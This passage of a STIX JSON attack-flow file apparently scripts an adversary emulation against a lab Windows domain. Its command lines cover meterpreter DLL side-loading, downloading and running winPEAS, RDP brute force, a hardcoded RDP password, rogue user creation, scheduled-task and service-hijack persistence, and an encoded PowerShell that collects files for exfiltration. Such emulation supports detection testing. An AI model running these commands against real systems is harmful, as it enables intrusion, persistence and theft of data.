+            "description": "DLL Side-Loading using the dotnet startup hook environment variable through meterpreter session",
+            "command_ref": "process--d6e31c8e-2e35-43ad-838e-af3643e0ef99",
+            "asset_refs": [
+                "attack-asset--54796238-92c8-46e6-8eb8-ac5c18f726c9"
+            ],
+            "effect_refs": [
+                "attack-action--03a7306b-a060-4293-901c-3ab21fcd8e87"
+            ],
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "attack-asset",
+            "spec_version": "2.1",
+            "id": "attack-asset--54796238-92c8-46e6-8eb8-ac5c18f726c9",
+            "created": "2024-05-12T08:18:08.16731Z",
+            "modified": "2024-05-12T08:18:08.16731Z",
+            "name": "asset",
+            "description": "Attacker",
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "process",
+            "spec_version": "2.1",
+            "id": "process--d6e31c8e-2e35-43ad-838e-af3643e0ef99",
+            "command_line": "tmux send-keys -t metasploit_handler 'upload C:\\\\Program Files\\\\dotnet\\\\T1574_002.dll' C-m\n;tmux send-keys -t metasploit_handler 'execute -f powershell.exe -Command \"set DOTNET_STARTUP_HOOKS=C:\\\\Program Files\\\\dotnet\\\\T1574_002.dll\"' C-m\n;tmux send-keys -t metasploit_handler 'execute -f dotnet -h > nul' C-m\n;tmux send-keys -t metasploit_handler 'execute f powershell.exe -Command \"echo 1\"' C-m"
+        },
+        {
+            "type": "attack-action",
+            "spec_version": "2.1",
+            "id": "attack-action--03a7306b-a060-4293-901c-3ab21fcd8e87",
+            "created": "2024-05-12T08:20:06.353148Z",
+            "modified": "2024-05-12T08:20:06.353148Z",
+            "technique_id": "T1018",
+            "name": "T1018",
+            "description": "List servers in domain Metasploit enum_ad_computers",
+            "command_ref": "process--0395e49d-72a6-466e-99ee-92d64f175593",
+            "asset_refs": [
+                "attack-asset--54796238-92c8-46e6-8eb8-ac5c18f726c9"
+            ],
+            "effect_refs": [
+                "attack-action--b783d12a-48a1-4a36-8337-4e0191d08aa5",
+                "attack-action--2c4cb228-34b0-4aea-8c81-e80f3dcd50e5",
+                "attack-action--566d3819-41a5-4e1c-9a9a-393a99bde8ef"
+            ],
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "attack-asset",
+            "spec_version": "2.1",
+            "id": "attack-asset--54796238-92c8-46e6-8eb8-ac5c18f726c9",
+            "created": "2024-05-12T08:18:08.16731Z",
+            "modified": "2024-05-12T08:18:08.16731Z",
+            "name": "asset",
+            "description": "Attacker",
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "process",
+            "spec_version": "2.1",
+            "id": "process--0395e49d-72a6-466e-99ee-92d64f175593",
+            "command_line": "tmux send-keys -t metasploit_handler 'sessions -s post/windows/gather/enum_ad_computers' C-m"
+        },
+        {
+            "type": "attack-action",
+            "spec_version": "2.1",
+            "id": "attack-action--2c4cb228-34b0-4aea-8c81-e80f3dcd50e5",
+            "created": "2024-05-12T08:20:06.352663Z",
+            "modified": "2024-05-12T08:20:06.352663Z",
+            "technique_id": "T1087.002: Account Discovery",
+            "name": "T1087.002: Account Discovery",
+            "description": "Inherited or executed simultaneously",
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "attack-action",
+            "spec_version": "2.1",
+            "id": "attack-action--566d3819-41a5-4e1c-9a9a-393a99bde8ef",
+            "created": "2024-05-12T08:20:06.352663Z",
+            "modified": "2024-05-12T08:20:06.352663Z",
+            "technique_id": " Domain Account",
+            "name": " Domain Account",
+            "description": "Inherited or executed simultaneously",
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "attack-action",
+            "spec_version": "2.1",
+            "id": "attack-action--b783d12a-48a1-4a36-8337-4e0191d08aa5",
+            "created": "2024-05-12T08:20:06.352165Z",
+            "modified": "2024-05-12T08:20:06.352165Z",
+            "technique_id": "T1049",
+            "name": "T1049",
+            "description": "List TCP connections Metasploit post tcpnetstat",
+            "command_ref": "process--7b5743e7-ad0e-4261-ab2e-dea95e409b46",
+            "asset_refs": [
+                "attack-asset--54796238-92c8-46e6-8eb8-ac5c18f726c9"
+            ],
+            "effect_refs": [
+                "attack-action--29be2744-8cac-4748-adf4-a97c4aa7a047"
+            ],
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "attack-asset",
+            "spec_version": "2.1",
+            "id": "attack-asset--54796238-92c8-46e6-8eb8-ac5c18f726c9",
+            "created": "2024-05-12T08:18:08.16731Z",
+            "modified": "2024-05-12T08:18:08.16731Z",
+            "name": "asset",
+            "description": "Attacker",
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "process",
+            "spec_version": "2.1",
+            "id": "process--7b5743e7-ad0e-4261-ab2e-dea95e409b46",
+            "command_line": "tmux send-keys -t metasploit_handler 'sessions -s post/windows/gather/tcpnetstat' C-m"
+        },
+        {
+            "type": "attack-action",
+            "spec_version": "2.1",
+            "id": "attack-action--29be2744-8cac-4748-adf4-a97c4aa7a047",
+            "created": "2024-05-12T08:20:06.351176Z",
+            "modified": "2024-05-12T08:20:06.351176Z",
+            "technique_id": "T1049",
+            "name": "T1049",
+            "description": "Enumerate Domain Controllers",
+            "command_ref": "process--b7457e1b-d3f5-4ec5-bd65-066f1a952a85",
+            "asset_refs": [
+                "attack-asset--54796238-92c8-46e6-8eb8-ac5c18f726c9"
+            ],
+            "effect_refs": [
+                "attack-action--587030d3-0c86-46f9-8d53-bc312f60e3c5"
+            ],
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "attack-asset",
+            "spec_version": "2.1",
+            "id": "attack-asset--54796238-92c8-46e6-8eb8-ac5c18f726c9",
+            "created": "2024-05-12T08:18:08.16731Z",
+            "modified": "2024-05-12T08:18:08.16731Z",
+            "name": "asset",
+            "description": "Attacker",
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "process",
+            "spec_version": "2.1",
+            "id": "process--b7457e1b-d3f5-4ec5-bd65-066f1a952a85",
+            "command_line": "Net group \"Domain Controllers\" /domain\n;wget http:///winPEASx64.exe -OutFile winPEASx64.exe; .\\winPEASx64.exe\n;\n;\n"
+        },
+        {
+            "type": "attack-action",
+            "spec_version": "2.1",
+            "id": "attack-action--587030d3-0c86-46f9-8d53-bc312f60e3c5",
+            "created": "2024-05-12T08:20:06.350684Z",
+            "modified": "2024-05-12T08:20:06.350684Z",
+            "technique_id": "T1110.001",
+            "name": "T1110.001",
+            "description": "RDP brutforce using crackmapexec",
+            "command_ref": "process--b155d242-e969-4c31-8e84-2dbc53d99143",
+            "asset_refs": [
+                "attack-asset--54796238-92c8-46e6-8eb8-ac5c18f726c9"
+            ],
+            "effect_refs": [
+                "attack-action--02f674e1-bb4d-4714-ad40-6fae2d45c057"
+            ],
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "attack-asset",
+            "spec_version": "2.1",
+            "id": "attack-asset--54796238-92c8-46e6-8eb8-ac5c18f726c9",
+            "created": "2024-05-12T08:18:08.16731Z",
+            "modified": "2024-05-12T08:18:08.16731Z",
+            "name": "asset",
+            "description": "Attacker",
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "process",
+            "spec_version": "2.1",
+            "id": "process--b155d242-e969-4c31-8e84-2dbc53d99143",
+            "command_line": "head -n 40 /usr/share/wordlists/rockyou.txt > pass.list\n;echo \"2138\" >> pass.list\n;crackmapexec rdp -u root -p pass.list  --rdp-timeout 2"
+        },
+        {
+            "type": "attack-action",
+            "spec_version": "2.1",
+            "id": "attack-action--02f674e1-bb4d-4714-ad40-6fae2d45c057",
+            "created": "2024-05-12T08:20:06.350197Z",
+            "modified": "2024-05-12T08:20:06.350197Z",
+            "technique_id": "T1135",
+            "name": "T1135",
+            "description": "SMB discovery using crackmapexec",
+            "command_ref": "process--e7c55a5b-8e94-4ea4-91aa-2dafad891b06",
+            "asset_refs": [
+                "attack-asset--54796238-92c8-46e6-8eb8-ac5c18f726c9"
+            ],
+            "effect_refs": [
+                "attack-action--b37f27da-9fae-4cb7-9d61-6283d9db85a4"
+            ],
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "attack-asset",
+            "spec_version": "2.1",
+            "id": "attack-asset--54796238-92c8-46e6-8eb8-ac5c18f726c9",
+            "created": "2024-05-12T08:18:08.16731Z",
+            "modified": "2024-05-12T08:18:08.16731Z",
+            "name": "asset",
+            "description": "Attacker",
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "process",
+            "spec_version": "2.1",
+            "id": "process--e7c55a5b-8e94-4ea4-91aa-2dafad891b06",
+            "command_line": "crackmapexec smb \n;crackmapexec smb -u '' -p '' \n;crackmapexec smb -u 'root' -p '' "
+        },
+        {
+            "type": "attack-action",
+            "spec_version": "2.1",
+            "id": "attack-action--b37f27da-9fae-4cb7-9d61-6283d9db85a4",
+            "created": "2024-05-12T08:20:06.34918Z",
+            "modified": "2024-05-12T08:20:06.34918Z",
+            "technique_id": "T1021.001",
+            "name": "T1021.001",
+            "description": "Attempt an RDP session via Remote Desktop Application to a DomainController thourgh first target host",
+            "command_ref": "process--3821e254-5c97-44c6-a33e-44e9eddab1d3",
+            "asset_refs": [
+                "attack-asset--fc557c2d-579f-44e6-b408-d9b222e242df"
+            ],
+            "effect_refs": [
+                "attack-action--b04114c4-7a34-4374-bb86-64e75f9a8cf1"
+            ],
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "attack-asset",
+            "spec_version": "2.1",
+            "id": "attack-asset--fc557c2d-579f-44e6-b408-d9b222e242df",
+            "created": "2024-05-12T08:18:08.167805Z",
+            "modified": "2024-05-12T08:18:08.167805Z",
+            "name": "asset",
+            "description": "TargetLaterMovement",
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "process",
+            "spec_version": "2.1",
+            "id": "process--3821e254-5c97-44c6-a33e-44e9eddab1d3",
+            "command_line": "$Server=10.0.0.10;  $User = Join-Path aptsimulator.lab kk; $Password=\"ntvggfhjkm212!A\"; cmdkey /generic:TERMSRV/$Server /user:$User /pass:$Password;  mstsc /v:$Server;"
+        },
+        {
+            "type": "attack-action",
+            "spec_version": "2.1",
+            "id": "attack-action--b04114c4-7a34-4374-bb86-64e75f9a8cf1",
+            "created": "2024-05-12T08:20:06.348708Z",
+            "modified": "2024-05-12T08:20:06.348708Z",
+            "technique_id": "T1136.001",
+            "name": "T1136.001",
+            "description": "Create a new local user in PowerShell",
+            "command_ref": "process--3729cf5e-a4e5-4c95-b673-5f0a8688a8cf",
+            "asset_refs": [
+                "attack-asset--fc557c2d-579f-44e6-b408-d9b222e242df"
+            ],
+            "effect_refs": [
+                "attack-action--306ab08c-12b2-4afc-9afe-00bd6c3e141e"
+            ],
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "attack-asset",
+            "spec_version": "2.1",
+            "id": "attack-asset--fc557c2d-579f-44e6-b408-d9b222e242df",
+            "created": "2024-05-12T08:18:08.167805Z",
+            "modified": "2024-05-12T08:18:08.167805Z",
+            "name": "asset",
+            "description": "TargetLaterMovement",
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "process",
+            "spec_version": "2.1",
+            "id": "process--3729cf5e-a4e5-4c95-b673-5f0a8688a8cf",
+            "command_line": "New-LocalUser -Name \"test_user_t1136\" -NoPassword\n"
+        },
+        {
+            "type": "attack-action",
+            "spec_version": "2.1",
+            "id": "attack-action--306ab08c-12b2-4afc-9afe-00bd6c3e141e",
+            "created": "2024-05-12T08:20:06.348188Z",
+            "modified": "2024-05-12T08:20:06.348188Z",
+            "technique_id": "T1053.005",
+            "name": "T1053.005",
+            "description": "Add binary to run on startup",
+            "command_ref": "process--3a395d70-295f-41ae-9734-bb3fa739b4b8",
+            "asset_refs": [
+                "attack-asset--ad83ba17-907e-4db9-a6e1-78947bda22db"
+            ],
+            "effect_refs": [
+                "attack-action--325f05bc-7d02-48a2-a835-9a2e597f7dab"
+            ],
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "attack-asset",
+            "spec_version": "2.1",
+            "id": "attack-asset--ad83ba17-907e-4db9-a6e1-78947bda22db",
+            "created": "2024-05-12T08:18:08.16731Z",
+            "modified": "2024-05-12T08:18:08.16731Z",
+            "name": "asset",
+            "description": "TargetFirstWindows",
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "process",
+            "spec_version": "2.1",
+            "id": "process--3a395d70-295f-41ae-9734-bb3fa739b4b8",
+            "command_line": "schtasks /create /tn \"T1053_005_OnLogon\" /sc onlogon /tr \"cmd.exe /c calc.exe\"\n;schtasks /create /tn \"T1053_005_OnStartup\" /sc onstart /ru system /tr \"cmd.exe /c calc.exe\""
+        },
+        {
+            "type": "attack-action",
+            "spec_version": "2.1",
+            "id": "attack-action--325f05bc-7d02-48a2-a835-9a2e597f7dab",
+            "created": "2024-05-12T08:20:06.347196Z",
+            "modified": "2024-05-12T08:20:06.347196Z",
+            "technique_id": "T1136.001",
+            "name": "T1136.001",
+            "description": "Create a new local user in PowerShell",
+            "command_ref": "process--b5218544-4914-4f4a-a361-680fe99074c3",
+            "asset_refs": [
+                "attack-asset--ad83ba17-907e-4db9-a6e1-78947bda22db"
+            ],
+            "effect_refs": [
+                "attack-action--90770568-0ea5-45d7-9095-d3eb1148d281"
+            ],
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "attack-asset",
+            "spec_version": "2.1",
+            "id": "attack-asset--ad83ba17-907e-4db9-a6e1-78947bda22db",
+            "created": "2024-05-12T08:18:08.16731Z",
+            "modified": "2024-05-12T08:18:08.16731Z",
+            "name": "asset",
+            "description": "TargetFirstWindows",
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "process",
+            "spec_version": "2.1",
+            "id": "process--b5218544-4914-4f4a-a361-680fe99074c3",
+            "command_line": "New-LocalUser -Name \"test_user_t1136\" -NoPassword\n"
+        },
+        {
+            "type": "attack-action",
+            "spec_version": "2.1",
+            "id": "attack-action--90770568-0ea5-45d7-9095-d3eb1148d281",
+            "created": "2024-05-12T08:20:06.3467Z",
+            "modified": "2024-05-12T08:20:06.3467Z",
+            "technique_id": "T1112",
+            "name": "T1112",
+            "description": "Modify Registry under current user",
+            "command_ref": "process--6b3c2a2b-fb02-4bcb-8677-9b884a0c96ba",
+            "asset_refs": [
+                "attack-asset--ad83ba17-907e-4db9-a6e1-78947bda22db"
+            ],
+            "effect_refs": [
+                "attack-action--5d260a17-98e0-4c33-b4ac-cc8b4ac66f30"
+            ],
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "attack-asset",
+            "spec_version": "2.1",
+            "id": "attack-asset--ad83ba17-907e-4db9-a6e1-78947bda22db",
+            "created": "2024-05-12T08:18:08.16731Z",
+            "modified": "2024-05-12T08:18:08.16731Z",
+            "name": "asset",
+            "description": "TargetFirstWindows",
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "process",
+            "spec_version": "2.1",
+            "id": "process--6b3c2a2b-fb02-4bcb-8677-9b884a0c96ba",
+            "command_line": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /t REG_DWORD /v HideFileExt /d 1 /f\n;reg add HKEY_CURRENT_USER\\Software\\APTSimulator\\NewSetting /v T1112Test /t REG_SZ /d \"T1112Test\" /f"
+        },
+        {
+            "type": "attack-action",
+            "spec_version": "2.1",
+            "id": "attack-action--5d260a17-98e0-4c33-b4ac-cc8b4ac66f30",
+            "created": "2024-05-12T08:20:06.345709Z",
+            "modified": "2024-05-12T08:20:06.345709Z",
+            "technique_id": "T1543.003",
+            "name": "T1543.003",
+            "description": "Modify default Fax by changing the binPath to PowerShell to spawn powershell.",
+            "command_ref": "process--ef650c22-e420-41d8-9c7b-80ed37b0ee27",
+            "asset_refs": [
+                "attack-asset--ad83ba17-907e-4db9-a6e1-78947bda22db"
+            ],
+            "effect_refs": [
+                "attack-action--41b3bb7e-6a8a-49bf-8edd-477c25d1edba"
+            ],
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "attack-asset",
+            "spec_version": "2.1",
+            "id": "attack-asset--ad83ba17-907e-4db9-a6e1-78947bda22db",
+            "created": "2024-05-12T08:18:08.16731Z",
+            "modified": "2024-05-12T08:18:08.16731Z",
+            "name": "asset",
+            "description": "TargetFirstWindows",
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "process",
+            "spec_version": "2.1",
+            "id": "process--ef650c22-e420-41d8-9c7b-80ed37b0ee27",
+            "command_line": "sc config Fax binPath=\"C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -noexit -c \\\"write-host 'T1543.003 Test'\\\"\"\n;sc start Fax"
+        },
+        {
+            "type": "attack-action",
+            "spec_version": "2.1",
+            "id": "attack-action--41b3bb7e-6a8a-49bf-8edd-477c25d1edba",
+            "created": "2024-05-12T08:20:06.345213Z",
+            "modified": "2024-05-12T08:20:06.345213Z",
+            "technique_id": "T1113",
+            "name": "T1113",
+            "description": "Take screenshot using Metasploit screengrab",
+            "command_ref": "process--98845907-d4c3-480f-8b66-926f0c776356",
+            "asset_refs": [
+                "attack-asset--54796238-92c8-46e6-8eb8-ac5c18f726c9"
+            ],
+            "effect_refs": [
+                "attack-action--2c626c1f-121a-4273-b440-284d2595693b"
+            ],
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "attack-asset",
+            "spec_version": "2.1",
+            "id": "attack-asset--54796238-92c8-46e6-8eb8-ac5c18f726c9",
+            "created": "2024-05-12T08:18:08.16731Z",
+            "modified": "2024-05-12T08:18:08.16731Z",
+            "name": "asset",
+            "description": "Attacker",
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "process",
+            "spec_version": "2.1",
+            "id": "process--98845907-d4c3-480f-8b66-926f0c776356",
+            "command_line": "tmux send-keys -t metasploit_handler 'sessions -c screengrab' C-m"
+        },
+        {
+            "type": "attack-action",
+            "spec_version": "2.1",
+            "id": "attack-action--2c626c1f-121a-4273-b440-284d2595693b",
+            "created": "2024-05-12T08:20:06.34422Z",
+            "modified": "2024-05-12T08:20:06.34422Z",
+            "technique_id": "T1012",
+            "name": "T1012",
+            "description": "Simply Query Registry",
+            "command_ref": "process--f667f6b7-6bec-47ee-a935-29287db238e6",
+            "asset_refs": [
+                "attack-asset--ad83ba17-907e-4db9-a6e1-78947bda22db"
+            ],
+            "effect_refs": [
+                "attack-action--12ae28b0-6611-4d72-8f9a-5ab29ca52127"
+            ],
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "attack-asset",
+            "spec_version": "2.1",
+            "id": "attack-asset--ad83ba17-907e-4db9-a6e1-78947bda22db",
+            "created": "2024-05-12T08:18:08.16731Z",
+            "modified": "2024-05-12T08:18:08.16731Z",
+            "name": "asset",
+            "description": "TargetFirstWindows",
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "process",
+            "spec_version": "2.1",
+            "id": "process--f667f6b7-6bec-47ee-a935-29287db238e6",
+            "command_line": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\"\n;reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\n;reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\n;reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\n;reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\n;reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\"\n;reg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit\"\n;reg query \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"\n;reg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"\n;reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad\n;reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n;reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\n;reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n;reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n;reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n;reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\n;reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\n;reg query HKLM\\system\\currentcontrolset\\services /s | findstr ImagePath 2>nul | findstr /Ri \".*\\.sys$\"\n;reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n;reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\n;reg query \"HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\"\n;reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\Scripts\\Startup\""
+        },
+        {
+            "type": "attack-action",
+            "spec_version": "2.1",
+            "id": "attack-action--12ae28b0-6611-4d72-8f9a-5ab29ca52127",
+            "created": "2024-05-12T08:20:06.343724Z",
+            "modified": "2024-05-12T08:20:06.343724Z",
+            "technique_id": "T1005",
+            "name": "T1005",
+            "description": "Search files of interest and save them to a single zip file and exfiltrate",
+            "command_ref": "process--3dbe57a2-a4d8-4d6b-a7a7-d440ef15a296",
+            "asset_refs": [
+                "attack-asset--ad83ba17-907e-4db9-a6e1-78947bda22db"
+            ],
+            "effect_refs": [
+                "attack-action--3e71b611-f72a-44aa-8753-70d2d8a4225a",
+                "attack-action--4280ccca-4d3f-4d4b-8d47-b4dfded0524d",
+                "attack-action--171f9a4b-afe3-4785-b789-5e67d40d1b64"
+            ],
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "attack-asset",
+            "spec_version": "2.1",
+            "id": "attack-asset--ad83ba17-907e-4db9-a6e1-78947bda22db",
+            "created": "2024-05-12T08:18:08.16731Z",
+            "modified": "2024-05-12T08:18:08.16731Z",
+            "name": "asset",
+            "description": "TargetFirstWindows",
+            "extensions": {
+                "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "process",
+            "spec_version": "2.1",
+            "id": "process--3dbe57a2-a4d8-4d6b-a7a7-d440ef15a296",
+            "command_line": "powershell -Encodedcommand \"JABzAHQAYQByAHQAaQBuAGcARABpAHIAZQBjAHQAbwByAHkAIAA9ACAAIgAjAHsAcwB0AGEAcgB0AGkAbgBnAF8AZABpAHIAZQBjAHQAbwByAHkAfQAiAAoAJABvAHUAdABwAHUAdABaAGkAcAAgAD0AIAAiACMAewBvAHUAdABwAHUAdABfAHoAaQBwAF8AZgBvAGwAZABlAHIAXwBwAGEAdABoAH0AIgAKACQAZgBpAGwAZQBFAHgAdABlAG4AcwBpAG8AbgBzAFMAdAByAGkAbgBnACAAPQAgACIAIwB7AGYAaQBsAGUAXwBlAHgAdABlAG4AcwBpAG8AbgBzAH0AIgAgAAoAJABmAGkAbABlAEUAeAB0AGUAbgBzAGkAbwBuAHMAIAA9ACAAJABmAGkAbABlAEUAeAB0AGUAbgBzAGkAbwBuAHMAUwB0AHIAaQBuAGcAIAAtAHMAcABsAGkAdAAgACIALAAgACIACgAKAE4AZQB3AC0ASQB0AGUAbQAgAC0AVAB5AHAAZQAgAEQAaQByAGUAYwB0AG8AcgB5ACAAJABvAHUAdABwAHUAdABaAGkAcAAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAASQBnAG4AbwByAGUAIAAtAEYAbwByAGMAZQAgAHwAIABPAHUAdAAtAE4AdQBsAGwACgAKAEYAdQBuAGMAdABpAG8AbgAgAFMAZQBhAHIAYwBoAC0ARgBpAGwAZQBzACAAewAKACAAIABwAGEAcgBhAG0AIAAoAAoAIAAgACAAIABbAHMAdAByAGkAbgBnAF0AJABkAGkAcgBlAGMAdABvAHIAeQAKACAAIAApAAoAIAAgACQAZgBpAGwAZQBzACAAPQAgAEcAZQB0AC0AQwBoAGkAbABkAEkAdABlAG0AIAAtAFAAYQB0AGgAIAAkAGQAaQByAGUAYwB0AG8AcgB5ACAALQBGAGkAbABlACAALQBSAGUAYwB1AHIAcwBlACAAfAAgAFcAaABlAHIAZQAtAE8AYgBqAGUAYwB0ACAAewAKACAAIAAgACAAJABmAGkAbABlAEUAeAB0AGUAbgBzAGkAbwBuAHMAIAAtAGMAbwBuAHQAYQBpAG4AcwAgACQAXwAuAEUAeAB0AGUAbgBzAGkAbwBuAC4AVABvAEwAbwB3AGUAcgAoACkACgAgACAAfQAKACAAIAByAGUAdAB1AHIAbgAgACQAZgBpAGwAZQBzAAoAfQAKAAoAJABmAG8AdQBuAGQARgBpAGwAZQBzACAAPQAgAFMAZQBhAHIAYwBoAC0ARgBpAGwAZQBzACAALQBkAGkAcgBlAGMAdABvAHIAeQAgACQAcwB0AGEAcgB0AGkAbgBnAEQAaQByAGUAYwB0AG8AcgB5AAoAaQBmACAAKAAkAGYAbwB1AG4AZABGAGkAbABlAHMALgBDAG8AdQBuAHQAIAAtAGcAdAAgADAAKQAgAHsACgAgACAAJABmAG8AdQBuAGQARgBpAGwAZQBQAGEAdABoAHMAIAA9ACAAJABmAG8AdQBuAGQARgBpAGwAZQBzAC4ARgB1AGwAbABOAGEAbQBlAAoAIAAgAEMAbwBtAHAAcgBlAHMAcwAtAEEAcgBjAGgAaQB2AGUAIAAtAFAAYQB0AGgAIAAkAGYAbwB1AG4AZABGAGkAbABlAFAAYQB0AGgAcwAgAC0ARABlAHMAdABpAG4AYQB0AGkAbwBuAFAAYQB0AGgAIAAiACQAbwB1AHQAcAB1AHQAWgBpAHAAXABkAGEAdABhAC4AegBpAHAAIgAKAAoAIAAgAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiAFoAaQBwACAAZgBpAGwAZQAgAGMAcgBlAGEAdABlAGQAOgAgACQAbwB1AHQAcAB1AHQAWgBpAHAAXABkAGEAdABhAC4AegBpAHAAIgAKACAAIAB9ACAAZQBsAHMAZQAgAHsACgAgACAAIAAgACAAIABXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgBOAG8AIABmAGkAbABlAHMAIABmAG8AdQBuAGQAIAB3AGkAdABoACAAdABoAGUAIABzAHAAZQBjAGkAZgBpAGUAZAAgAGUAeAB0AGUAbgBzAGkAbwBuAHMALgAiAAoAIAAgAH0A\""
+        },
+        {
+            "type": "attack-action",
+            "spec_version": "2.1",
